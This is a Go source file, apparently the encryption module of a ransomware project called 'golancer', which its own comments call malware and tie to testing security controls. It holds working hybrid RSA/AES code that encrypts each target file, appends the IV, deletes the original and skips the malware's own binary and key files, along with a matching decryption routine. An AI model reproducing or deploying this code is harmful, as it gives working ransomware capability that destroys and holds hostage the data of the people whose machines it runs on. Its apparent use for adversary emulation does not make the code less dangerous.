package cryptutil

import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

// Generate 2048-bit RSA keypair
func GenerateRSA() *rsa.PrivateKey {
	rsaKeys, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Fatal(err)
	}

	return rsaKeys
}

//Generate random 32-byte AES key
func GenerateAES(aesBytes *[]byte) {
	*aesBytes = make([]byte, 32)

	if _, err := rand.Read(*aesBytes); err != nil {
		log.Fatal(err)
	}
}

// Save AES key to file system, hex encoded. Key can be plaintext or encrypted
// This function is insecure, and should not be used in a live demo when testing security controls
func SaveAESKey(aesBytes []byte, fileName string) {
	encodedBytes := hex.EncodeToString(aesBytes)

	file, err := os.Create(fileName)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	_, err = file.WriteString(encodedBytes)
	if err != nil {
		log.Fatal(err)
	}
}

// Read hex encoded AES key from file and return byte array. Key can be encrypted or unencrypted, but must be hex encoded
func LoadAESKey(aesKey *[]byte, filename string) {
	encodedBytes, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatal(err)
	}

	*aesKey, err = hex.DecodeString(string(encodedBytes))
	if err != nil {
		log.Fatal(err)
	}
}

// Saves RSA private key to file in x509 PKCS1 format
// This function should never be performed on the target system that is used for testing security controls
func SaveRSAPrivateKey(privateKey rsa.PrivateKey, fileName string) {
	privateKeyBytes := x509.MarshalPKCS1PrivateKey(&privateKey)

	block := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privateKeyBytes,
	}

	file, err := os.Create(fileName)
	if err != nil {
		log.Fatal(err)
	}

	err = pem.Encode(file, block)
	if err != nil {
		log.Fatal(err)
	}

}

// Reads RSA key formatted in x509 PKCS1 from file and returns the key value in type 'rsa.PrivateKey'
func LoadRSAPrivateKey(filename string) *rsa.PrivateKey {

	keyBytes, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatal(err)
	}

	block, _ := pem.Decode(keyBytes)

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatal(err)
	}

	return privateKey
}

func SaveRSAPublicKey(publicKey rsa.PublicKey, fileName string) {
	publicKeyBytes, err := x509.MarshalPKIXPublicKey(&publicKey)
	if err != nil {
		log.Fatal(err)
	}
	block := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: publicKeyBytes,
	}

	file, err := os.Create(fileName)
	if err != nil {
		log.Fatal(err)
	}

	err = pem.Encode(file, block)
	if err != nil {
		log.Fatal(err)
	}
}

func LoadRSAPublicKey(fileName string) rsa.PublicKey {
	var pubKey rsa.PublicKey
	keyBytes, err := ioutil.ReadFile(fileName)
	if err != nil {
		log.Fatal(err)
	}

	block, _ := pem.Decode(keyBytes)

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		log.Fatal(err)
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		pubKey = *pub
	default:
		log.Fatal("Unrecognized key format:")
		log.Fatal(err)
	}

	return pubKey
}

//Encrypt the AES key with OAEP RSA public key
func EncryptAESKey(aesBytes *[]byte, pubkey rsa.PublicKey) []byte {
	encryptedBytes, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		&pubkey,
		*aesBytes,
		nil)
	if err != nil {
		log.Fatal(err)
	}

	return encryptedBytes
}

//Decrypt the AES key with the RSA private key
func DecryptAESKey(encryptedAESKey []byte, privateKey rsa.PrivateKey) []byte {
	decyptedAESKey, err := privateKey.Decrypt(nil, encryptedAESKey, &rsa.OAEPOptions{Hash: crypto.SHA256})
	if err != nil {
		log.Fatal(err)
	}

	return decyptedAESKey
}

func EncryptFile(filename string, extension string, aeskey *[]byte) {

	// Don't want to encrypt the malware itself ;) or any already encrypted files
	switch {
	case strings.HasSuffix(filename, filepath.Base(os.Args[0])):
		return
	case strings.HasSuffix(filename, extension):
		return
	case strings.HasSuffix(filename, "private.pem"):
		return
	case strings.HasSuffix(filename, "public.pem"):
		return
	case strings.HasSuffix(filename, "files.txt"):
		return
	case strings.HasSuffix(filename, "golancer.key"):
		return
	case strings.HasSuffix(filename, "golancer-e.key"):
		return
	case strings.HasSuffix(filename, "desktop.ini"):
		return
	}

	// Open target file
	infile, err := os.Open(filename)
	if err != nil {
		log.Println(err)
	}

	// Create cipher block using an AES key
	block, err := aes.NewCipher(*aeskey)
	if err != nil {
		log.Println(err)
	}

	// Create random initialization vector
	initvector := make([]byte, block.BlockSize())
	if _, err := io.ReadFull(rand.Reader, initvector); err != nil {
		log.Println(err)
	}

	outfile, err := os.OpenFile(filename+extension, os.O_RDWR|os.O_CREATE, 0777)
	if err != nil {
		log.Println(err)
	}
	defer outfile.Close()

	buf := make([]byte, 1024)
	stream := cipher.NewCTR(block, initvector)

	for {
		n, err := infile.Read(buf)

		if n > 0 {
			stream.XORKeyStream(buf, buf[:n])
			// Write buffer to file
			outfile.Write(buf[:n])
		}

		if err == io.EOF {
			break
		}

		if err != nil {
			log.Printf("Read %d bytes: %v", n, err)
			return
		}

	}
	// Append the initialization vector to end of file
	outfile.Write(initvector)
	// Close original file stream so that we may delete it from the system. (You cannot delete open files on Windows.)
	infile.Close()
	// Delete original unencrypted file
	os.Remove(filename)
}

func DecryptFile(filename string, extension string, aeskey *[]byte) {
	// Open target file
	infile, err := os.Open(filename + extension)
	if err != nil {
		log.Printf("File: %v, not found.", filename+extension)
		return
	}
	// Close file once function has finished execution
	defer infile.Close()

	// Create cipher block using an AES key
	block, err := aes.NewCipher(*aeskey)
	if err != nil {
		log.Println(err)
	}

	// Get file statistics, used for grabbing file size
	fileinfo, err := infile.Stat()
	if err != nil {
		log.Println(err)
	}

	// Initialization vector (IV) will be read from the end of the file.
	initvector := make([]byte, block.BlockSize())
	// IV is at end of the file, so the original message length is shortened by the length of the IV
	msgLen := fileinfo.Size() - int64(len(initvector))
	// Read the IV from the file
	_, err = infile.ReadAt(initvector, msgLen)
	if err != nil {
		log.Println(err)
	}
	// Create file to write decrypted contents
	outfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0777)
	if err != nil {
		log.Println(err)
	}
	defer outfile.Close()

	buf := make([]byte, 1024)
	stream := cipher.NewCTR(block, initvector)

	for {
		n, err := infile.Read(buf)
		if n > 0 {
			// Account for the initialization vector at the end of the file
			if n > int(msgLen) {
				n = int(msgLen)
			}
			msgLen -= int64(n)

			stream.XORKeyStream(buf, buf[:n])
			outfile.Write(buf[:n])

		}

		if err == io.EOF {
			break
		}

		if err != nil {
			log.Printf("Read %d bytes: %v", n, err)
			break
		}
	}
}
